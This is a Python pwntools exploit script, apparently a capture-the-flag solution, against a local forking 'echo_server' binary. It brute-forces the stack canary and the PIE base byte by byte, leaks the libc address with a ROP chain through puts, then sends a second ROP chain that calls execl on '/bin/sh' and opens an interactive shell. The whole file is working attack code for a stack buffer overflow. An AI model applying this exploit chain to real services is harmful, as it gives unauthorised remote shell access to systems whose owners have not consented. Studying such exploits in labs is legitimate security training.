#!/usr/bin/python3
from pwn import *

exe = ELF("./echo_server_patched")
libc = ELF("./libc.so.6")

context.binary = exe
context.log_level = "critical"

HOST = "127.0.0.1"
PORT = 21542

gdbscript = """
set follow-fork-mode parent
break system
"""

PADDING = b"a" * 0x78
CANARY = b""

# args.DEBUG = True

def init_server():
    r = process([exe.path])

    if args.DEBUG:
        gdb.attach(r, gdbscript=gdbscript)

def conn():
    r = remote(HOST, PORT)
    return r

def bruteforce(func, starting, target_len = 8):
    value = starting
    
    while len(value) < target_len:
        for i in range(0x100):
            if i == 0xa:
                continue
            
            if func(value + bytes([i])):
                value += bytes([i])
                break
            
    return value

def bruteforce_base(base):
    r = conn()

    r.send(PADDING + CANARY + b"a" * 24 + base)
    r.recvuntil(b"BYE!\n\n")
    
    line = r.recvall()
    r.close()
    return b"BYE!" in line

def bruteforce_canary(canary):
    r = conn()
    
    r.send(PADDING + canary)
    r.recvuntil(b"BYE!")
    
    line = r.recvall()
    r.close()
    return b"stack" not in line

def call_system():
    BINSH = pack(next(libc.search(b"/bin/sh\0")))
    POP_RDI = pack(exe.address + 0x1478)
    SYSTEM = pack(libc.symbols.execl)

    ROP = POP_RDI + BINSH + SYSTEM 
    
    r = conn()
    r.send(PADDING + CANARY + b"a" * 24 + ROP)
    
    r.interactive()
    r.close()
    
def leak_libc():
    rop = ROP(exe)
    rop.call("puts", [exe.got.puts])
    
    payload = PADDING + CANARY + b"a" * 24 + rop.chain()
    r = conn()
    r.send(payload)
    r.recvuntil(b"BYE!\n\n")
    
    line = r.recvall().strip()
    libc.address = int.from_bytes(line, "little") - libc.symbols.puts
    r.close()
    
def main():
    init_server()

    global CANARY
    CANARY = bruteforce(bruteforce_canary, b"\x00")
    print(f"LEAKED CANARY: {hex(int.from_bytes(CANARY, 'little'))}")
    
    BASE = bruteforce(bruteforce_base, b"\x94")
    exe.address = int.from_bytes(BASE, "little") - 0x1794
    print(f"LEAKED BASE: {hex(exe.address)}")
    
    leak_libc()
    print(f"LEAKED LIBC: {hex(libc.address)}")
    
    call_system()

if __name__ == "__main__":
    main()
